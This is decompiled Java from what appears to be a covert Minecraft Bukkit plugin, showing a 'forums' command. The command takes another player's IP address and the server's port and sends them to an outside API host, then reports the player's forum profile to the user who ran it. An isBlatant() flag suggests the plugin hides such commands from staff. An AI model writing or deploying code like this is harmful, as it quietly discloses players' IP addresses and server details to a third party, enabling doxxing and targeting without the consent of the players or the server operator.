/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 *  org.json.JSONObject
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.json.JSONObject;

public class ForumsCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (args.length <= 1) {
            p2.sendMessage(Settings.USAGE("forums <player>"));
        } else {
            Player target = Bukkit.getServer().getPlayer(args[1]);
            if (target == null) {
                p2.sendMessage(Settings.PREFIX("The player " + Settings.RED + args[1] + Settings.WHITE + " is not online."));
            } else {
                try {
                    String inputLine;
                    URL auth = new URL("https://api." + Settings.AUTHOR.toLowerCase() + "/?ip=" + target.getAddress().getHostString() + "&port=" + Bukkit.getServer().getPort());
                    HttpURLConnection con = (HttpURLConnection)auth.openConnection();
                    con.addRequestProperty("User-Agent", "Mozilla");
                    BufferedReader in2 = new BufferedReader(new InputStreamReader(con.getInputStream()));
                    StringBuffer response = new StringBuffer();
                    while ((inputLine = in2.readLine()) != null) {
                        response.append(inputLine);
                    }
                    in2.close();
                    if (response.toString().length() == 0) {
                        p2.sendMessage(Settings.PREFIX("This user was not found!"));
                    } else {
                        JSONObject myresponse = new JSONObject(response.toString());
                        if (!myresponse.getBoolean("success")) {
                            p2.sendMessage(Settings.PREFIX(Settings.RED + target.getName() + Settings.WHITE + " is unranked and their forum profile is " + Settings.RED + Settings.AUTHOR + "/forums/members/" + myresponse.getInt("user_id")));
                        } else {
                            p2.sendMessage(Settings.PREFIX(Settings.RED + target.getName() + Settings.WHITE + " is ranked and their forum profile is " + Settings.RED + Settings.AUTHOR + "/forums/members/" + myresponse.getInt("user_id")));
                        }
                    }
                }
                catch (IOException e2) {
                    p2.sendMessage(Settings.PREFIX(e2.getMessage()));
                }
            }
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}

